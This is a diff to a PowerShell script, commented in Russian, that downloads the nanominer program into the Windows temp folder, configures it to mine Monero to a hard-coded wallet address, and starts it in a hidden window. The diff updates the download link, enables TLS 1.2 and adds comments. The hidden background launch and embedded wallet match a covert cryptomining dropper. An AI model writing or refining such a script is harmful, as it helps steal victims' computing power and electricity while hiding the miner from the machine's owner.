@@ -1,11 +1,14 @@
-# === Настройки ===
-$downloadUrl = "https://github.com/nanopool/nanominer/releases/latest/download/nanominer-windows.zip"
-$downloadPath = "$env:TEMP\nanominer-windows.zip"
-$extractPath = "$env:TEMP\nanominer"
-$configFilePath = "$extractPath\config.ini"
-$minerExecutable = "$extractPath\nanominer.exe"
+# === Включение поддержки TLS 1.2 для безопасного соединения ===
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-# Конфигурация майнинга
+# === Настройки для скачивания и установки ===
+$downloadUrl = "https://github.com/nanopool/nanominer/releases/download/v3.9.3/nanominer-windows-3.9.3.zip"  # Актуальная ссылка
+$downloadPath = "$env:TEMP\nanominer-windows-3.9.3.zip"  # Путь для сохранения архива
+$extractPath = "$env:TEMP\nanominer"  # Путь для распаковки
+$configFilePath = "$extractPath\config.ini"  # Путь к конфигурационному файлу
+$minerExecutable = "$extractPath\nanominer.exe"  # Путь к исполнимому файлу NanoMiner
+
+# === Конфигурация майнинга ===
 $coin = "xmr"
 $wallet = "45wjbEoJWy9ZBJtXRQJSvdfx2U3q8FvCwjPNZrPSJCjwZCu3GrNtskPPbcbE18sWHENTxG23xPwPwg1DabVnPFRE2eiqLDq"
 $rigname = "XMR"
@@ -65,7 +68,7 @@ try {
     Write-Log "Запуск NanoMiner в скрытом режиме..."
     $startInfo = New-Object System.Diagnostics.ProcessStartInfo
     $startInfo.FileName = $minerExecutable
-    $startInfo.WindowStyle = 'Hidden' # Скрытый режим
+    $startInfo.WindowStyle = 'Hidden'  # Скрытый режим
     $startInfo.UseShellExecute = $true
     [System.Diagnostics.Process]::Start($startInfo)
     Write-Log "NanoMiner успешно запущен в фоне."
